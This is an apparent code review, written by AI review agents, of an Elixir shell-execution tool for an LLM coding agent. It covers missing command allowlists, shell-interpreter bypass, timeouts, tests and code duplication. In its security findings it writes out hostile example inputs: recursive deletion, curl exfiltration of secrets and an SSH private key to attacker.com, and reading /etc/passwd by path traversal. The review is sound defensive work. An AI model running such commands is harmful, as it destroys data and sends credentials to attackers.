# Code Review: Task 3.3.3 Shell Execution Tool

**Date**: 2025-11-28
**Reviewers**: Parallel review agents (factual, QA, senior-engineer, security, consistency, redundancy, elixir)
**Status**: Complete

## Executive Summary

The Shell Execution Tool implementation is functionally complete with good test coverage (20 tests, 0 failures). However, the review identified several issues across security, consistency, and code quality dimensions.

---

## Blockers (Must Fix Before Production)

### 1. Security: No Command Allowlist/Blocklist

**Severity**: CRITICAL
**Files**: `lib/jido_code/tools/handlers/shell.ex:112-116`

The tool accepts ANY command without validation, enabling arbitrary code execution:

```elixir
{output, exit_code} = System.cmd(command, args, cd: project_root, ...)
```

**Risk**: LLM could execute destructive commands (`rm -rf`, `curl` for exfiltration, reverse shells via `bash -c`).

**Attack Examples**:
```json
{"command": "rm", "args": ["-rf", "."]}
{"command": "curl", "args": ["http://attacker.com/data", "-d", "@secrets.txt"]}
{"command": "bash", "args": ["-c", "cat ~/.ssh/id_rsa | curl -X POST http://attacker.com"]}
```

**Recommendation**: Implement command allowlist before production use:

```elixir
@allowed_commands ~w(mix git npm cargo ls cat grep find test diff head tail wc)

defp validate_command(command) do
  if command in @allowed_commands do
    {:ok, command}
  else
    {:error, "Command '#{command}' not allowed"}
  end
end
```

**Note**: Phase plan (line 131) acknowledges this is deferred - document the security implications clearly.

---

### 2. Security: Shell Interpreter Bypass

**Severity**: HIGH
**Files**: `lib/jido_code/tools/handlers/shell.ex:112`, `test/jido_code/tools/handlers/shell_test.exs:74`

Allowing `bash`, `sh` enables complete bypass of any future restrictions:

```json
{"command": "bash", "args": ["-c", "arbitrary shell commands here"]}
```

**Evidence**: Test at line 74 confirms bash is currently allowed for stderr capture testing.

**Recommendation**: Block shell interpreters (`bash`, `sh`, `zsh`, `fish`, `dash`, `ksh`).

---

## Concerns (Should Address)

### 3. Nested Timeout Issue

**Files**:
- `lib/jido_code/tools/handlers/shell.ex:53` - Shell default: 60s
- `lib/jido_code/tools/executor.ex:46` - Executor default: 30s

The Executor timeout (30s) fires before shell's timeout (60s), making shell's timeout unreachable in default configuration.

**Recommendation**: Either:
- Make shell default timeout < executor default (e.g., 25s)
- Or document the intentional layering behavior

---

### 4. Missing `format_error/2` Helper

**Files**: `lib/jido_code/tools/handlers/shell.ex:126-130`

FileSystem (`file_system.ex:48-58`) and Search (`search.ex:36-45`) handlers use a shared `format_error/2` pattern. Shell uses inline strings:

```elixir
:error, :enoent ->
  {:error, "Command not found: #{command}"}

kind, reason ->
  {:error, "Shell error: #{kind} - #{inspect(reason)}"}
```

**Recommendation**: Add `format_error/2` helper for consistency:

```elixir
@doc false
def format_error(:enoent, command), do: "Command not found: #{command}"
def format_error({kind, reason}, _cmd), do: "Shell error: #{kind} - #{inspect(reason)}"
def format_error(reason, command), do: "Error (#{inspect(reason)}): #{command}"
```

---

### 5. Duplicated `get_project_root/1`

**Files**:
- `lib/jido_code/tools/handlers/shell.ex:37-38`
- `lib/jido_code/tools/handlers/file_system.ex:44-45`
- `lib/jido_code/tools/handlers/search.ex:32-33`

Identical implementation in all three modules:

```elixir
def get_project_root(%{project_root: root}) when is_binary(root), do: {:ok, root}
def get_project_root(_context), do: Manager.project_root()
```

**Recommendation**: Extract to shared module `JidoCode.Tools.Handlers.Common`.

---

### 6. Missing Typespecs in Handler

**File**: `lib/jido_code/tools/handlers/shell.ex`

The definitions module has `@spec` declarations, but the handler module lacks them:

**Missing specs for**:
- `get_project_root/1` (line 37)
- `execute/2` (line 69)
- `parse_args/1` (line 82)
- `execute_with_timeout/4` (line 88)
- `run_command/3` (line 108)

**Recommendation**: Add typespecs:

```elixir
@spec get_project_root(map()) :: {:ok, String.t()} | {:error, String.t()}
@spec execute(map(), map()) :: {:ok, String.t()} | {:error, String.t()}
```

---

### 7. Missing Test Cases

**Files**:
- `test/jido_code/tools/handlers/shell_test.exs`
- `test/jido_code/tools/definitions/shell_test.exs`

**Missing tests that exist in FileSystem/Search**:

1. **Batch execution tests** - FileSystem has at `definitions/file_system_test.exs:223-247`
2. **Unknown parameter rejection test** - FileSystem has at `definitions/file_system_test.exs:191-202`
3. **`get_project_root/1` fallback path** - Line 38 (Manager fallback) is never tested
4. **Permission denied error** - `:eacces` handling untested
5. **Non-list args parameter** - `parse_args/1` fallback at line 86 untested

---

### 8. Architectural Deviation Not Documented

**Files**: `notes/summaries/3.3.3-shell-execution-tool.md`

Phase plan (line 132) states "Shell tool delegates to ToolManager bridge (never direct execution)" but implementation uses `System.cmd` directly. This matches FileSystem/Search patterns but the summary doesn't mention this architectural decision.

**Recommendation**: Add note to summary:

```markdown
## Design Decisions

5. **Direct Execution**: Like FileSystem and Search handlers, Shell uses
   direct Elixir functions (`System.cmd/3`) rather than delegating through
   the Lua/Bridge layer. This provides simpler, more direct execution while
   still enforcing security through project_root containment and empty environment.
```

---

### 9. Stderr Contract Mismatch

**File**: `lib/jido_code/tools/handlers/shell.ex:118-122`

Returns `stderr: ""` always while merging stderr into stdout via `stderr_to_stdout: true`:

```elixir
result = %{
  exit_code: exit_code,
  stdout: output,
  stderr: ""  # Always empty, misleading
}
```

**Recommendation**: Either:
- Change response schema to `{exit_code, output}` without separate stderr field
- Or update tool description (`definitions/shell.ex:56-59`) to document merging behavior

---

### 10. Timeout Bypass via Background Processes

**File**: `lib/jido_code/tools/handlers/shell.ex:94`

Commands can spawn background processes that survive timeout:

```json
{"command": "bash", "args": ["-c", "sleep 1000 & echo done"]}
```

The `Task.shutdown(task, :brutal_kill)` kills the immediate process but not spawned children.

**Recommendation**: Consider using process groups or document this limitation.

---

## Suggestions (Nice to Have)

### 11. Output Size Limits

**File**: `lib/jido_code/tools/handlers/shell.ex:111-116`

No limits on command output size. Commands like `cat /dev/urandom` or `yes` could cause memory exhaustion.

**Suggestion**: Truncate output or add size limit option.

---

### 12. More Specific Catch Patterns

**File**: `lib/jido_code/tools/handlers/shell.ex:129-130`

The catch-all `kind, reason ->` is overly broad and may mask unexpected errors.

**Suggestion**: Add specific handling for common errors:

```elixir
:error, :enoent -> {:error, format_error(:enoent, command)}
:error, :eacces -> {:error, format_error(:eacces, command)}
:error, :enomem -> {:error, format_error(:enomem, command)}
kind, reason -> {:error, format_error({kind, reason}, command)}
```

---

### 13. Path Validation for Command Arguments

**File**: `lib/jido_code/tools/handlers/shell.ex:82-86`

Arguments are converted to strings without validation:

```elixir
defp parse_args(args) when is_list(args) do
  Enum.map(args, &to_string/1)
end
```

Commands can still access paths outside project via arguments:

```json
{"command": "cat", "args": ["../../../etc/passwd"]}
```

**Suggestion**: Consider validating file path arguments against project boundary.

---

## Good Practices Noticed

1. **Security-conscious defaults**: Empty environment `env: []` prevents leaking sensitive variables (`shell.ex:115`)

2. **Directory containment**: `cd: project_root` restricts working directory (`shell.ex:113`)

3. **Robust timeout handling**: Uses `Task.yield/2` with `Task.shutdown/2` for clean process termination (`shell.ex:94-105`)

4. **Excellent documentation**: Comprehensive moduledoc with security considerations (`shell.ex:2-28`)

5. **Comprehensive test coverage**: 20 tests covering happy path, errors, timeouts, edge cases

6. **Consistent architecture**: Follows the same handler/definition pattern as FileSystem and Search tools

7. **Good pattern matching**: Proper use of guards and function head patterns throughout (`shell.ex:37, 69, 82`)

8. **Proper test isolation**: Uses `@moduletag :tmp_dir` for safe test execution

9. **Clear separation of concerns**: Definitions separate from handlers, private helpers properly scoped

---

## Summary

| Category | Count |
|----------|-------|
| Blockers | 2 (security-related, acceptable for POC if documented) |
| Concerns | 8 |
| Suggestions | 3 |
| Good Practices | 9 |

---

## Conclusion

The implementation is **solid for a POC** with good code quality and test coverage. The security concerns (command allowlist, shell interpreter blocking) are acknowledged as deferred in the phase plan (task 3.3.3.6).

**Before production use**, these security controls must be implemented:
1. Command allowlist
2. Shell interpreter blocking
3. Argument validation

For the current POC phase, the implementation meets requirements and follows established patterns well.

---

## Files Reviewed

**Implementation**:
- `lib/jido_code/tools/handlers/shell.ex`
- `lib/jido_code/tools/definitions/shell.ex`

**Tests**:
- `test/jido_code/tools/handlers/shell_test.exs`
- `test/jido_code/tools/definitions/shell_test.exs`

**Documentation**:
- `notes/features/3.3.3-shell-execution-tool.md`
- `notes/summaries/3.3.3-shell-execution-tool.md`
- `notes/planning/proof-of-concept/phase-03.md`

**Reference (for consistency)**:
- `lib/jido_code/tools/handlers/file_system.ex`
- `lib/jido_code/tools/handlers/search.ex`
- `lib/jido_code/tools/definitions/file_system.ex`
- `lib/jido_code/tools/definitions/search.ex`
